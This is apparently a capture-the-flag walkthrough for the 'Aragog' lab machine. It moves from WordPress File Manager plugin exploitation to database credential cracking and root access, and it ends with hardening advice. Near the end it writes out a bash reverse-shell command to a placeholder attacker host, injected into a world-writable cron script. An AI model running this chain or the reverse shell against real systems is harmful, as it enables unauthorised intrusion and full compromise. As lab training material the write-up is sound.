#  Aragog CTF ‚Äì Summary Walkthrough  

A full text-based breakdown of the **Aragog vulnerable machine**.  
This challenge demonstrates WordPress exploitation via a vulnerable plugin, horizontal privilege escalation through database credential reuse, and root compromise by abusing insecure cron jobs.  

##  Discovery  
- Ran nmap scan:  
nmap -sV -A <ip>

- Found ports:  
- 80 (HTTP ‚Äì Web Server)  
- 22 (SSH)  

‚û°Ô∏è Insight: The target exposes a web application and remote SSH access.  

##  Enumeration  
- Ran Gobuster against HTTP service:  
gobuster dir -u http://<ip>/
-w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
-x txt,log,php,html,bak,zip

- Found:  
- `/blog` ‚Üí Running **WordPress CMS**  
- `/javascript`  

- Extracted target domain name from `/blog` page source and added to `/etc/hosts`.  
- Enumerated WordPress with WPScan:  
wpscan --url http://<ip>/blog
-e vp --plugins-detection mixed
--api-token <token>

- Identified **vulnerable File Manager plugin**.  
- Verified exploit with `searchsploit`.  

‚úÖ WordPress confirmed exploitable.  

##  Foothold  
- Loaded Metasploit and executed File Manager RCE module.  
- Successfully gained shell as **www-data**.  

‚úÖ Initial foothold established.  

## User Escalation (www-data ‚Üí hagrid98)  
- Uploaded and ran **linpeas.sh** in `/tmp`.  
- Extracted MySQL credentials ‚Üí logged into database.  
mysql -u <username> -p<password>
SHOW DATABASES;
USE <db>;
SHOW TABLES;
SELECT * FROM <table_name>;

- Retrieved and cracked password hash for user **hagrid98** using John + rockyou.txt.  
- Switched to user account with cracked credentials.  

‚úÖ Access as **hagrid98** achieved.  

##  Privilege Escalation (hagrid98 ‚Üí root)  
- Uploaded **pspy64.py** to monitor running processes.  
- Observed recurring execution of `/opt/.backup.sh` by root.  
- File was world-writable ‚Üí modified script to spawn reverse shell:  
```bash
echo '#!/bin/bash' > /opt/.backup.sh
echo 'bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1' >> /opt/.backup.sh
Set up listener ‚Üí triggered by cron ‚Üí reverse root shell gained.

‚úÖ Full root compromise achieved üéâ

## Recommendations
WordPress Hardening
Remove unused/vulnerable plugins immediately.

Regularly patch WordPress core, themes, and plugins.

Restrict admin accounts with least privilege.

Deploy WAF to block automated exploit attempts.

Privilege Escalation Prevention
Lock down cron jobs ‚Äî root-owned scripts must never be world-writable.

Enforce strict permissions (chmod 700).

Monitor scheduled tasks for unusual modifications.
